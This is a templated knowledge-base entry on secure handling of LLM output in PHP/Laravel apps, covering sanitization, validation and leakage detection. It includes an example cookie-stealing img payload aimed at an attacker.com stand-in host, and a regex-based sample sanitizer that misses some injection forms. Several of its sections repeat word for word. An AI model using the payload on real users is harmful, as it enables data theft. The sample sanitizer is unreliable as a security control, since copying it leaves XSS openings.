# Knowledge Unit: Secure Output Handling

## Metadata

- **ID:** ku-06
- **Subdomain:** AI Safety & Security
- **Slug:** secure-output-handling
- **Version:** 1.0.0
- **Maturity:** Stable
- **Status:** Published

## Executive Summary

Secure output handling encompasses the validation, sanitization, and safe rendering of LLM-generated content before it reaches end users or downstream systems. LLM outputs can contain prompt injection artifacts (attempts to manipulate the application), hallucinated data (incorrect facts presented as truth), malicious code (in code generation contexts), or PII (if the model regurgitates training data). This KU covers the patterns for ensuring that LLM output is safe, accurate, and appropriate for its destination.

## Core Concepts

- **Output Validation:** Checking that the LLM's response conforms to expected format, structure, and content constraints.
- **Output Sanitization:** Removing or escaping unsafe content (HTML/JS injection, markdown injection, command injection).
- **Content Safety Check:** Applying content moderation to LLM output before displaying to users.
- **Format Enforcement:** Ensuring the response matches the requested format (JSON, markdown, plain text, HTML).
- **Hallucination Detection:** Identifying factually incorrect claims in LLM output (using grounding, consistency checks, or secondary LLM eval).
- **Data Leakage Detection:** Checking if the LLM output contains sensitive information from training data or context.
- **Safe Rendering:** Escaping LLM output appropriately for the rendering context (HTML, markdown, PDF, email).

## Mental Models

- **Output Validation:** Checking that the LLM's response conforms to expected format, structure, and content constraints.
- **Output Sanitization:** Removing or escaping unsafe content (HTML/JS injection, markdown injection, command injection).
- **Content Safety Check:** Applying content moderation to LLM output before displaying to users.


## Internal Mechanics

The internal mechanics of Secure Output Handling follow established patterns within the AI Safety & Security domain. The implementation leverages the Laravel AI SDK conventions and ecosystem best practices.

- **Validate structure before content.** Check that JSON is parseable, markdown is well-formed, or the response matches the expected schema before inspecting content.
- **Apply output-specific escaping.** HTML output needs HTML escaping; markdown output needs markdown sanitization; shell commands need command escaping.
- **Never render raw LLM output as HTML** without sanitization. Use DOMPurify (JS) or HTML Purifier (PHP).
- **Use allowlists for format enforcement.** Define what's allowed in the output (e.g., allowed HTML tags, allowed markdown elements) and strip everything else.
- **Log output validation failures** â€” they may indicate prompt injection, model issues, or data corruption.
- **Implement red teaming** â€” have security testers attempt to generate harmful outputs and verify your filters catch them.

## Patterns

- **Validate structure before content.** Check that JSON is parseable, markdown is well-formed, or the response matches the expected schema before inspecting content.
- **Apply output-specific escaping.** HTML output needs HTML escaping; markdown output needs markdown sanitization; shell commands need command escaping.
- **Never render raw LLM output as HTML** without sanitization. Use DOMPurify (JS) or HTML Purifier (PHP).
- **Use allowlists for format enforcement.** Define what's allowed in the output (e.g., allowed HTML tags, allowed markdown elements) and strip everything else.
- **Log output validation failures** â€” they may indicate prompt injection, model issues, or data corruption.
- **Implement red teaming** â€” have security testers attempt to generate harmful outputs and verify your filters catch them.

## Architectural Decisions

- Output handling should be the **last middleware in the response pipeline**, after content moderation but before response serialization.
- For structured outputs (JSON), validate against a **JSON Schema** before returning to the client.
- For streaming outputs, apply **per-chunk sanitization** where possible (dangerous patterns rarely span chunks).
- Use a **dedicated output validator service** that handles format validation, content safety, and data leakage detection.
- For hallucination detection, use **grounding verification**: compare LLM claims against a trusted knowledge base (RAG context, vector DB results).

## Tradeoffs

Standard approach vs Custom implementation is the primary tradeoff in this KU. Standard implementations offer faster development and community support but may have overhead. Custom implementations provide tailored solutions at the cost of maintenance burden.

## Performance Considerations

- JSON schema validation adds <0.5ms for small payloads.
- HTML sanitization adds 1-5ms depending on content length.
- Hallucination detection with a secondary LLM adds significant latency (500ms+) and cost. Use it only for high-stakes outputs.
- Per-chunk streaming sanitization is harder to implement but adds minimal latency (sub-millisecond per chunk).
- Cache validation results: if the same output is generated for different users, validate once.

## Production Considerations

- **HTML/JS injection:** The most common LLM output vulnerability. Always sanitize HTML output, even if the model is "trusted."
- **Markdown injection:** Malicious markdown can exfiltrate data via embedded images or links. Strip `javascript:` URLs, `onerror` handlers.
- **Code execution:** If LLM output is used in shell commands, SQL queries, or eval(), strict validation and parameterization are essential.
- **SSRF via output:** LLM output that constructs URLs could redirect users to malicious sites. Validate all generated URLs against an allowlist.
- **Data exfiltration:** LLM output that includes `<img src='https://attacker.com/steal?cookie='>` can leak user data. Strip dynamic content loading.

## Common Mistakes

- Rendering LLM output as raw HTML without sanitization â€” the most common and dangerous mistake.
- Only validating output format, not content â€” a valid JSON response can contain malicious data.
- Assuming LLM output is safe because the model is aligned â€” alignment is not a security control.
- Not handling streaming output differently â€” validation that works for complete responses may miss issues in partial chunks.
- Skipping output validation for authenticated/admin users â€” admins are also vulnerable to injection attacks.

## Failure Modes

- **Trust-by-Default:** Assuming the LLM's output is safe because "it's just text." LLM output can contain active content.
- **Output as Authority:** Using LLM-generated content to make security decisions (e.g., "is this email spam?" â€” the LLM's answer must be validated independently).
- **Same Treatment for All Output:** Treating plain text, markdown, HTML, and JSON with the same escaping rules. Each format has different injection vectors.
- **Client-Side-Only Sanitization:** Relying on the browser to sanitize LLM output. The server must validate and sanitize before sending.

## Ecosystem Usage

### HTML Output Sanitizer
```php
class OutputSanitizer {
    public function sanitizeHtml(string $llmOutput): string {
        // Strip dangerous tags and attributes
        $allowedTags = '<p><br><strong><em><ul><ol><li><a><code><pre>';
        $clean = strip_tags($llmOutput, $allowedTags);

        // Remove javascript: protocol from links
        $clean = preg_replace('/href=["\']javascript:[^"\']*["\']/i', 'href="#blocked"', $clean);

        // Remove event handlers
        $clean = preg_replace('/\son\w+=["\'][^"\']*["\']/i', '', $clean);

        return $clean;
    }

    public function validateJson(string $llmOutput, array $schema): array {
        $decoded = json_decode($llmOutput, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new OutputValidationException('Invalid JSON: ' . json_last_error_msg());
        }
        // Validate against schema
        $validator = new JsonSchemaValidator();
        if (!$validator->validate($decoded, $schema)) {
            throw new OutputValidationException('JSON schema validation failed');
        }
        return $decoded;
    }
}
```

### Output Validation Pipeline
```php
$outputPipeline = new OutputPipeline([
    new FormatValidator($schemaRegistry),
    new ContentSafetyCheck($moderationService),
    new HtmlSanitizer($allowedTags),
    new PiiLeakageDetector($piiPatterns),
    new HallucinationDetector($groundingSource), // optional, expensive
]);

$safeOutput = $outputPipeline->process($llmResponse, $context);
```

## Related Knowledge Units

- ku-01 (Prompt Injection Prevention): Preventing injection at the input side.
- ku-02 (Content Moderation & Safety Filtering): Content safety for output.
- ku-04 (Data Privacy & PII Protection): PII leakage detection in output.
- ai-middleware-gateway/ku-04: Output transformation at the gateway.
- prompt-engineering-systems/ku-04: Prompt patterns for structured output.

## Research Notes

Source: Domain analysis for AI and Intelligence Systems (Laravel/PHP ecosystem)
Source: Laravel AI SDK documentation and ecosystem package references

